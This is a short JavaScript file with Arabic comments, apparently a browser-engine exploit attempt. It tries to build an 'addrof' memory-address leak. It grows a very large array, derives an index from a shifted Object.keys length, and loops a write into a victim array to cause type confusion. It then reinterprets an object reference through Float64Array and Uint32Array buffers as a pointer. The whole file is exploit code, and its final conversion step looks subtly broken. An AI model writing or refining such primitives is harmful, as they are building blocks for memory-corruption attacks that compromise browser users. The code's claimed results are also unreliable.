function correct_addrof() {
    let output = "🎯 **الطريقة الصحيحة لتسريب العناوين**\n\n";
    
    let arr = [];
    for (let i = 0; i < 2000; i++) arr[i] = i + 0.1;
    for (let i = 0; i < (1 << 22); i++) arr[i] = i + 0.1;
    
    // كائن الهدف
    let target_obj = {
        marker: 0x13371337,
        data: "TARGET_OBJECT"
    };
    
    let victim = [1.1, 2.2, 3.3];
    let largeLength = Object.keys(arr).length;
    let index = (largeLength << 3) >> 31;
    
    output += "📝 الخطة: استخدام مصفوفة مختلطة الأنواع\n\n";
    
    // الخطوة 1: إنشاء مصفوفة مختلطة الأنواع
    let mixed_array = [1.1, target_obj, 3.3]; // [double, object, double]
    
    // الخطوة 2: استخدام الثغرة لقلب الأنواع
    let confusion_victim = [1.1, 2.2, 3.3];
    
    for (let i = 1; i >= index; i--) {
        confusion_victim[i] = mixed_array; // تخزين المصفوفة المختلطة
    }
    
    output += "الحالة بعد الثغرة:\n";
    output += `confusion_victim[0]: ${typeof confusion_victim[0]}\n`;
    output += `confusion_victim[1]: ${typeof confusion_victim[1]}\n`;
    output += `confusion_victim[2]: ${typeof confusion_victim[2]}\n`;
    
    // الآن confusion_victim[1] يجب أن تحتوي على المصفوفة المختلطة
    if (typeof confusion_victim[1] === 'object') {
        output += "\n✅ تم حقن المصفوفة المختلطة\n";
        
        // حاول الوصول إلى العناصر
        try {
            let element_0 = confusion_victim[1][0]; // يجب أن يكون double
            let element_1 = confusion_victim[1][1]; // يجب أن يكون object
            
            output += `confusion_victim[1][0]: ${element_0} (${typeof element_0})\n`;
            output += `confusion_victim[1][1]: ${element_1} (${typeof element_1})\n`;
            
            // إذا كان element_1 لا يزال كائن، جرب تحويله
            if (typeof element_1 === 'object') {
                let f64 = new Float64Array(1);
                let u32 = new Uint32Array(f64.buffer);
                f64[0] = element_1; // قد يعطينا NaN أو المؤشر
                
                let addr = (BigInt(u32[1]) << 32n) | BigInt(u32[0]);
                output += `المحاولة 1: 0x${addr.toString(16)}\n`;
            }
        } catch(e) {
            output += `خطأ في الوصول: ${e.message}\n`;
        }
    }
    
    alert(output);
}

correct_addrof();